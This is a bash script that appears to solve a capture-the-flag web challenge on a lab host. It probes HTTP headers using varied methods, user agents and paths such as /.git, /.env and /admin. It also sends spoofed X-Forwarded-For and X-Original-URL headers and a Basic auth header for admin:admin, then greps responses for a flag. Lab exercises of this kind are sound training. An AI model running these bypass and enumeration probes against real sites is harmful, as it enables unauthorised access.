#!/bin/bash

TARGET="http://web0x04.hbtn"
OUTPUT_FILE="1-flag.txt"

echo "=== HTTP Header Discovery Challenge Solver ==="
echo "Target: $TARGET"
echo ""

# Function to check for flags in headers
check_for_flag() {
    local headers="$1"
    local context="$2"
    
    # Look for flag patterns in headers
    flag=$(echo "$headers" | grep -ioE "(flag|x-flag|x-secret|x-hidden)[:\s]*[^\r\n]+" | head -1)
    
    if [ ! -z "$flag" ]; then
        echo "  [!] Potential flag found in $context:"
        echo "      $flag"
        
        # Extract just the value
        flag_value=$(echo "$flag" | sed -E 's/^[^:]*:\s*//')
        echo "$flag_value" > "$OUTPUT_FILE"
        echo "[SUCCESS] Flag saved to $OUTPUT_FILE"
        return 0
    fi
    return 1
}

# Step 1: Basic header inspection
echo "[+] Step 1: Basic GET request headers..."
headers=$(curl -s -D - http://web0x04.hbtn/ -o /dev/null)
echo "$headers"
check_for_flag "$headers" "basic GET request" && exit 0
echo ""

# Step 2: Different HTTP methods
echo "[+] Step 2: Trying different HTTP methods..."

methods=("HEAD" "OPTIONS" "POST" "PUT" "DELETE" "TRACE" "PATCH")
for method in "${methods[@]}"; do
    echo "  Trying $method method..."
    headers=$(curl -s -D - -X "$method" "$TARGET/" -o /dev/null 2>&1)
    check_for_flag "$headers" "$method request" && exit 0
done
echo ""

# Step 3: Different User-Agents
echo "[+] Step 3: Trying different User-Agents..."

user_agents=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "curl/7.68.0"
    "PostmanRuntime/7.26.8"
)

for ua in "${user_agents[@]}"; do
    echo "  Trying User-Agent: ${ua:0:50}..."
    headers=$(curl -s -D - -A "$ua" "$TARGET/" -o /dev/null)
    check_for_flag "$headers" "User-Agent: $ua" && exit 0
done
echo ""

# Step 4: Different paths
echo "[+] Step 4: Trying different paths..."

paths=(
    "/"
    "/index.html"
    "/index.php"
    "/admin"
    "/admin/"
    "/secret"
    "/flag"
    "/robots.txt"
    "/sitemap.xml"
    "/nonexistent"
    "/.git"
    "/.env"
)

for path in "${paths[@]}"; do
    echo "  Checking path: $path"
    headers=$(curl -s -D - "$TARGET$path" -o /dev/null)
    check_for_flag "$headers" "path: $path" && exit 0
done
echo ""

# Step 5: Custom headers
echo "[+] Step 5: Trying custom request headers..."

custom_headers=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Original-URL: /admin"
    "X-Flag: true"
    "X-Secret: true"
    "X-Debug: true"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "Authorization: Basic YWRtaW46YWRtaW4="
)

for header in "${custom_headers[@]}"; do
    echo "  Trying header: $header"
    headers=$(curl -s -D - -H "$header" "$TARGET/" -o /dev/null)
    check_for_flag "$headers" "custom header: $header" && exit 0
done
echo ""

# Step 6: Combination attempts
echo "[+] Step 6: Trying combinations..."

# Admin path with localhost headers
headers=$(curl -s -D - -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "$TARGET/admin" -o /dev/null)
check_for_flag "$headers" "admin path with localhost headers" && exit 0

# Different Accept headers
accept_types=(
    "application/json"
    "application/xml"
    "text/html"
    "text/plain"
    "*/*"
)

for accept in "${accept_types[@]}"; do
    echo "  Trying Accept: $accept"
    headers=$(curl -s -D - -H "Accept: $accept" "$TARGET/" -o /dev/null)
    check_for_flag "$headers" "Accept: $accept" && exit 0
done
echo ""

# Step 7: Display all unique headers found
echo "[+] Step 7: Summary of all unique headers found..."
echo ""
echo "All headers from basic request:"
curl -s -D - "$TARGET/" -o /dev/null | grep "^[A-Za-z-]*:" | sort -u
echo ""

echo "[!] Flag not found automatically. Please manually inspect the headers above."
echo "Look for custom headers starting with X- or containing words like 'flag', 'secret', 'hidden', etc."
